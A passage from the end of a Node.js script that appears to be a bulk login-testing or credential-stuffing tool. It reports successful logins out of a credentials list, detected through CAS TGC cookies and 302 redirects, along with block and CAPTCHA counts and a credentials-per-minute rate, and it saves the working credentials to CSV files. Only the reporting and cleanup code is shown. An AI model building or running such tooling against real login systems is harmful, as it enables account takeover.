      logger.info('[RETRY]', `  Total Succeeded: ${finalStats.totalSucceeded}`);
      logger.info('[RETRY]', `  Total Exhausted: ${finalStats.totalExhausted}`);
      logger.info('[RETRY]', `  Remaining in Queue: ${finalStats.currentQueueSize}`);
      logger.info('[RETRY]', '');
    }

    // ⭐ ============ REFINED FINAL REPORT ============

    // Stop monitoring
    if (monitoringInterval) {
      clearInterval(monitoringInterval);
    }

    // Render final dashboard or clear progress bar
    if (dashboard) {
      dashboard.renderFinalSummary();
    } else {
      logger.clearProgressBar();
    }

    const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
    const avgRate = (totalProcessed / (totalTime / 60)).toFixed(2);
    const successRate = totalProcessed > 0 ? ((totalSuccessful / totalProcessed) * 100).toFixed(2) : 0;
    const tgcRate = totalSuccessful > 0 ? ((totalTGC / totalSuccessful) * 100).toFixed(2) : 0;
    const redirect302Rate = totalSuccessful > 0 ? ((totalRedirect302 / totalSuccessful) * 100).toFixed(2) : 0;

    logger.info('[REPORT]', '');
    logger.info('[REPORT]', '════════════════════════════════════════════════════════════════════');
    logger.info('[REPORT]', 'FINAL TESTING REPORT - REFINED DETECTION');
    logger.info('[REPORT]', '════════════════════════════════════════════════════════════════════');
    logger.info('[REPORT]', '');

    logger.success('[REPORT]', `✅ SUCCESSFUL LOGINS (Confidence >= 85%):   ${totalSuccessful}`);
    logger.success('[REPORT]', `   ├─ 🔑 TGC Cookie Success:  ${totalTGC} (${tgcRate}% of successes)`);
    logger.success('[REPORT]', `   ├─ 🔄 Redirect 302 Success:  ${totalRedirect302} (${redirect302Rate}% of successes)`);
    logger.success('[REPORT]', `   └─ 📝 Other Methods: ${totalSuccessful - totalTGC - totalRedirect302}`);

    logger.error('[REPORT]', `❌ FAILED LOGINS:    ${totalProcessed - totalSuccessful - totalBlocked - totalCaptchas}`);
    logger.error('[REPORT]', `🚫 BLOCKED:     ${totalBlocked}`);
    logger.warn('[REPORT]', `⚠️  CAPTCHA DETECTED: ${totalCaptchas}`);

    logger.info('[REPORT]', '');
    logger.info('[REPORT]', '════════════════════════════════════════════════════════════════════');
    logger.info('[REPORT]', `Total Processed:  ${totalProcessed}/${credentials.length}`);
    logger.info('[REPORT]', `Success Rate: ${successRate}% (only high-confidence >= 85%)`);
    logger.info('[REPORT]', `TGC Cookie Rate: ${tgcRate}% (of successful logins)`);
    logger.info('[REPORT]', `Processing Rate: ${avgRate} credentials/minute`);
    logger.info('[REPORT]', `Total Time: ${totalTime} seconds`);
    logger.info('[REPORT]', '════════════════════════════════════════════════════════════════════');
    logger.info('[REPORT]', '');

    logger.info('[REPORT]', '📊 DETECTION METHOD BREAKDOWN: ');
    logger.success('[REPORT]', `   🔑 TGC Cookie (99% confidence):   ${totalTGC}`);
    logger.success('[REPORT]', `   🔄 Redirect 302 (99% confidence): ${totalRedirect302}`);
    logger.success('[REPORT]', `   📝 Other (85-95% confidence):     ${totalSuccessful - totalTGC - totalRedirect302}`);
    logger.info('[REPORT]', '');

    // ⭐ ============ SYSTEM & HEALTH REPORTS ============
    if (resourceManager) {
      const systemReport = resourceManager.exportSystemReport();
      
      logger.info('[SYSTEM]', '');
      logger.info('[SYSTEM]', '💻 SYSTEM PERFORMANCE REPORT:');
      logger.info('[SYSTEM]', `   Platform: ${systemReport.system.platform} (${systemReport.system.arch})`);
      logger.info('[SYSTEM]', `   CPU Cores: ${systemReport.system.cpuCount}`);
      logger.info('[SYSTEM]', `   Total Memory: ${systemReport.system.totalMemoryGB}GB`);
      logger.info('[SYSTEM]', `   Avg CPU Usage: ${systemReport.current.cpu}%`);
      logger.info('[SYSTEM]', `   Avg Memory Usage: ${systemReport.current.memory}%`);
      logger.info('[SYSTEM]', `   Free Memory: ${systemReport.current.freeMemoryGB}GB`);
      
      if (systemReport.recommendations && systemReport.recommendations.length > 0) {
        logger.info('[SYSTEM]', '   Recommendations:');
        systemReport.recommendations.forEach(rec => {
          logger.info('[SYSTEM]', `     - ${rec.message}`);
        });
      }
      
      logger.info('[SYSTEM]', '');
    }

    if (healthCheck) {
      const healthReport = healthCheck.exportReport();
      
      logger.info('[HEALTH]', '');
      logger.info('[HEALTH]', '🏥 HEALTH CHECK REPORT:');
      logger.info('[HEALTH]', `   Overall Health Score: ${healthReport.overall.score}%`);
      logger.info('[HEALTH]', `   Status: ${healthReport.overall.healthy ? '✅ Healthy' : '⚠️  Degraded'}`);
      logger.info('[HEALTH]', `   Checks: ${healthReport.overall.healthyChecks}/${healthReport.overall.totalChecks} passing`);
      
      if (healthReport.overall.failingChecks && healthReport.overall.failingChecks.length > 0) {
        logger.info('[HEALTH]', '   Failing Checks:');
        healthReport.overall.failingChecks.forEach(msg => {
          logger.warn('[HEALTH]', `     - ${msg}`);
        });
      }
      
      logger.info('[HEALTH]', '');
    }

    logger.info('[REPORT]', '📁 OUTPUT FILES GENERATED:');
    logger.success('[REPORT]', `   ✅ Successful Credentials:  logs/reports/successful_*.  csv`);
    logger.success('[REPORT]', `   ❌ Failed Credentials:  logs/reports/failed_*. csv`);
    logger.success('[REPORT]', `   📊 Full Results:  logs/reports/results_*. json`);
    logger.success('[REPORT]', `   📝 Detailed Logs:  logs/successful/*. jsonl`);
    logger.success('[REPORT]', `   📝 Detailed Logs:  logs/failed/*.jsonl`);
    logger.success('[REPORT]', `   📝 Detailed Logs:  logs/blocked/*.jsonl`);
    logger.success('[REPORT]', `   📝 Detailed Logs:  logs/captcha/*.jsonl`);
    logger.info('[REPORT]', '');

    logger.success('[REPORT]', `✅ All processing complete! `);
    logger.success('[REPORT]', `✅ Results saved to: ${logger.logDir}`);
    logger.info('[REPORT]', '');

    // Export results
    logger.info('[REPORT]', 'Generating detailed reports...');
    logger.exportResults('json');
    logger.exportResults('csv');

    logger.success('[REPORT]', `✅ Reports generated in: ${logger.logDir}`);
    logger.success('[REPORT]', '');

    // ⚡ PERFORMANCE: Flush logger buffers and cleanup before exit
    await logger.cleanup();
    
    process.exit(0);

  } catch (error) {
    logger.error('[FATAL]', `Fatal startup error: ${error && error.message}`);
    logger.error('[FATAL]', error && error.stack);
    
    // Clean up resources
    if (monitoringInterval) {
      clearInterval(monitoringInterval);
    }
    
    if (cli) {
      cli.close();
    }
    
    // ⚡ PERFORMANCE: Flush logger buffers before exit
    await logger.cleanup();
    
    process.exit(1);
  }
})();